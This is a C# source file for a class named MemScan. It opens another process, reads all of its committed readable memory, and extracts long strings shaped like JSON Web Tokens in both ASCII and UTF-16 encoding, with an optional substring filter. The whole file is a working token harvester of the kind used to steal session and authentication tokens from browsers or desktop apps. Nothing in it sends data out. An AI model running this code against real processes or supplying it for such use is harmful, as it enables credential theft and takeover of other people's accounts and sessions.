using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

public class MemScan
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(int access, bool inheritHandle, int processId);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);
    [DllImport("kernel32.dll")]
    static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MBI mbi, int dwLength);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out int lpNumberOfBytesRead);

    [StructLayout(LayoutKind.Sequential)]
    struct MBI
    {
        public IntPtr BaseAddress;
        public IntPtr AllocationBase;
        public uint AllocationProtect;
        public IntPtr RegionSize;
        public uint State;
        public uint Protect;
        public uint Type;
    }

    const int PROCESS_QUERY_INFORMATION = 0x0400;
    const int PROCESS_VM_READ = 0x0010;
    const uint MEM_COMMIT = 0x1000;
    static readonly uint[] readable = { 0x02, 0x04, 0x20, 0x40, 0x80 }; // READONLY, READWRITE, EXECUTE_READ, EXECUTE_READWRITE, WRITECOPY

    public static string[] Scan(int pid, string mustContain)
    {
        var results = new List<string>();
        IntPtr h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, pid);
        if (h == IntPtr.Zero) return new string[0];
        try
        {
            long addr = 0;
            MBI mbi;
            int mbiSize = Marshal.SizeOf(typeof(MBI));
            var found = new HashSet<string>();
            while (VirtualQueryEx(h, (IntPtr)addr, out mbi, mbiSize) != 0)
            {
                long size = (long)mbi.RegionSize;
                if (mbi.State == MEM_COMMIT && IsReadable(mbi.Protect) && size > 0 && size < (1L << 32))
                {
                    int chunk = size > 0x4000000 ? 0x4000000 : (int)size;
                    var buf = new byte[chunk];
                    long baseAddr = (long)mbi.BaseAddress;
                    long remaining = size;
                    long off = 0;
                    while (remaining > 0)
                    {
                        int toRead = remaining > chunk ? chunk : (int)remaining;
                        int read;
                        if (ReadProcessMemory(h, (IntPtr)(baseAddr + off), buf, toRead, out read) && read > 0)
                        {
                            ScanBuffer(buf, read, mustContain, found);
                        }
                        off += toRead;
                        remaining -= toRead;
                    }
                }
                addr += size;
                if (addr < 0) break;
            }
            results.AddRange(found);
        }
        finally { CloseHandle(h); }
        return results.ToArray();
    }

    static bool IsReadable(uint protect)
    {
        uint p = protect & 0xFF;
        foreach (uint r in readable) if (r == p) return true;
        return false;
    }

    static void ScanBuffer(byte[] buf, int len, string mustContain, HashSet<string> found)
    {
        // ASCII scan for "eyJ"
        for (int i = 0; i + 3 < len; i++)
        {
            if (buf[i] == 'e' && buf[i + 1] == 'y' && buf[i + 2] == 'J')
            {
                int j = i;
                while (j < len && IsB64(buf[j])) j++;
                if (j - i >= 500 && j - i <= 6000 && HasDot(buf, i, j))
                {
                    string s = Encoding.ASCII.GetString(buf, i, j - i);
                    if (mustContain.Length == 0 || s.Contains(mustContain)) found.Add(s);
                }
            }
        }
        // UTF-16LE scan for "eyJ"
        for (int i = 0; i + 5 < len; i += 2)
        {
            if (buf[i] == 'e' && buf[i + 1] == 0 && buf[i + 2] == 'y' && buf[i + 3] == 0 && buf[i + 4] == 'J' && buf[i + 5] == 0)
            {
                int j = i;
                while (j + 1 < len && IsB64(buf[j]) && buf[j + 1] == 0) j += 2;
                int chars = (j - i) / 2;
                if (chars >= 500 && chars <= 6000)
                {
                    var sb = new StringBuilder(chars);
                    bool dot = false;
                    for (int k = i; k < j; k += 2) { char c = (char)buf[k]; if (c == '.') dot = true; sb.Append(c); }
                    if (dot)
                    {
                        string s = sb.ToString();
                        if (mustContain.Length == 0 || s.Contains(mustContain)) found.Add(s);
                    }
                }
            }
        }
    }

    static bool HasDot(byte[] buf, int i, int j)
    {
        for (int k = i; k < j; k++) if (buf[k] == '.') return true;
        return false;
    }

    static bool IsB64(byte c)
    {
        return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.';
    }
}
